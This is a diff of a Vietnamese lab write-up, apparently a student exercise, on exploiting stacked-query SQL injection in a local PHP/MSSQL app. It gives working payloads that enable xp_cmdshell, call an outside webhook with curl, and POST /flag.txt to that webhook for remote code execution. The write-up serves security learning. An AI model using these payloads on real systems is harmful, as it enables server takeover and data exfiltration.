@@ -13,7 +13,7 @@ $cleaned_password = mysqli_real_escape_string($conn, $password);
 
 
 + Bắt đầu vào với một giao diện như trên
-![Alt text](image-1.png)
+![Alt text](./imageStackQuery/image.png)
 
 - Đây là đoạn code bị dính lỗi
 
@@ -39,7 +39,9 @@ if (isset($_GET['name'])) {
                     <div class="relative z-20 p-6 group">
                         <div class="relative block h-64 mb-4 -mt-56 overflow-hidden rounded -top-full ">
                             <img class="object-cover w-full h-full transition-all group-hover:scale-110"
-                                src="https://pplay.vn/media/catalog/product/cache/1/image/485x440/9df78eab33525d08d6e5fb8d27136e95/7/0/70222-1.jpg" alt="">
+                                
+                                 
+                        src="https://pplay.vn/media/catalog/product/cache/1/image/485x440/9df78eab33525d08d6e5fb8d27136e95/7/0/70222-1.jpg" alt="">
                             <div class="absolute flex flex-col top-4 right-4">
                                 <!-- Wishlist and Cart buttons here -->
                             </div>
@@ -123,13 +125,13 @@ if (isset($_GET['name'])) {
 - Bởi vì được truyền trực tiếp nên em có thể đoán là bị dính lỗi sql injection
 - Em sẽ khai thác theo hướng thực thi shell trong MSSQL đây là một dạng stack query
 - Vào trong burpsuite và chọn request bị dính lỗi như sau:
-![Alt text](image-2.png)
+![Alt text](./imageStackQuery/image-1.png)
 
 - Em thử thêm dấu ';' vào đằng sau và request vẫn thực hiện bình thường
-![Alt text](image-3.png)
+![Alt text](./imageStackQuery/image-2.png)
 - Sau đó em dùng payload "; WAITFOR DELAY '0:0:5'; -- "
 - Em nhận lại được response sau 5s
-![Alt text](image-4.png)
+![Alt text](./imageStackQuery/image-3.png)
 - Điều này chứng tỏ là em có thể thực hiện chồng query ở trong trường hợp này
 - Em muốn thực hiện được xp_cmdshell trong truy vấn để lấy dữ liệu
 + Ban đầu em sẽ phải cài đặt lại setting để có thể thực hiện shell
@@ -138,18 +140,19 @@ em tham khảo bài viết này:  https://medium.com/@notsoshant/a-not-so-blind-
 Và dùng payload :  ";EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; WAITFOR DELAY '0:0:5'; --"
 
 - Và em nhận được kết quả sau 5s  chứng tỏ là đã reconfig thành công
-![Alt text](image-5.png)
+![Alt text](./imageStackQuery/image-4.png)
 
 - Tiếp sau đó em thực thi shell curl đến webhook của em
 
- http://localhost/task2_KCSC/demo/stackQuery/index.php?name=items;EXEC%20xp_cmdshell%20%27curl+https://webhook.site/0891ab22-35c2-48c8-a228-bf505962e0d6%27;%20WAITFOR%20DELAY%20%270:0:5%27;%20--%20%22
+ http://localhost/task2_KCSC/demo/stackQuery/index.php?name=items;EXEC%20xp_cmdshell%20%27curl+https://webhook.site/0e0a8778-5ef0-4657-8aec-84076f5a552e;%20WAITFOR%20DELAY%20%270:0:5%27;%20--%20%22
 
 Và vào webhook em nhận được
-![Alt text](image-6.png)
+![Alt text](./imageStackQuery/image-5.png)
 - em tính revershell trên này mà để hôm sau em chuyển qua linux cho dễ ạ:v
 
-
-![Alt text](image-7.png)
 Em dùng payload này để lấy thông tin file flag.txt
-![Alt text](image-8.png)
+;EXEC%20xp_cmdshell%20%27curl+-X+POST+--data+"@/flag.txt"+-H+"Content-Type:+application/data"+https://webhook.site/0e0a8778-5ef0-4657-8aec-84076f5a552e%27;%20WAITFOR%20DELAY%20%270:0:5%27;%20--%20%22
+![Alt text](./imageStackQuery/image-6.png)
+Và kết quả:
+![Alt text](./imageStackQuery/image-7.png)
 Và em nhận được thông tin vậy là em đã RCE được sever @@
